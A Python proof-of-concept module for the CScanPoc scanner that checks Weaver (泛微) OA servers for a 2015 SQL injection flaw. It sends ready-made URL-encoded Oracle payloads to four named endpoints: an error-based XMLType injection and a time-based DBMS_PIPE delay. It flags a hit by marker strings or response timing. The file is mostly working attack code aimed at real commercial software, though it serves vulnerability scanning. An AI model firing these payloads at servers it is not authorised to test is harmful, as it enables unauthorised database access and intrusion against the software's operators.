# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'weaver_0023' # 平台漏洞编号，留空
    name = '泛微OA通用系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-08'  # 漏洞公布时间
    desc = '''
        泛微OA通用系统存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '133efec2-3ef0-4990-9635-a789a5f2df58'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2015-0138725
            #refer:http://www.wooyun.org/bugs/wooyun-2015-0140003
            hh = hackhttp.hackhttp()
            url = self.target + '/mobile/plugin/PreDownload.jsp?url=1'
            payload = '%27%20AND%207528%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287528%3D7528%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%271%27%3D%271'
            code, head, res, errcode, _ = hh.http(url + payload)
            if code == 200 and 'qzpxq1qbpxq' in res :
                #security_hole(url + "   :sql Injection")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            else:
                payload1 = '%27%20AND%201%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2871%29%7C%7CCHR%28103%29%7C%7CCHR%28119%29%2C5%29%20AND%20%271%27%3D%271'
                payload2  = payload1.replace('5','0')
                t1 = time.time()
                code1, head, res1, errcode, _ = hh.http(url + payload1)
                t2 = time.time()
                code2, head, res2, errcode, _ = hh.http(url + payload2)
                t3 = time.time()
                if code1==200 and code2 == 200 and (2*t2 - t1 - t3 > 3):
                    #security_hole(url + "   :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            payloads = [
                '/mobile/plugin/loadWfGraph.jsp?workflowid=1&requestid=1',
                '/ServiceAction/com.eweaver.workflow.subprocess.servlet.SubprocessAction?action=getlist&nodeid=1',
                '/ServiceAction/com.eweaver.workflow.workflow.servlet.WorkflowinfoAction?action=getreqxml&workflowid=1&id=2'
            ]
            getdata = '%27%20AND%209830%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2899%29%7C%7CCHR%28113%29%7C%7CCHR%28116%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283708%3D3708%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28109%29%7C%7CCHR%28122%29%7C%7CCHR%28111%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%271%27%3D%271'
            for payload in payloads:
                url = self.target + payload + getdata
                code, head, res, errcode, _ = hh.http(url)
                if code == 200 and 'qcqtq1qmzoq' in res :
                    #security_hole(arg + payload + "   :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
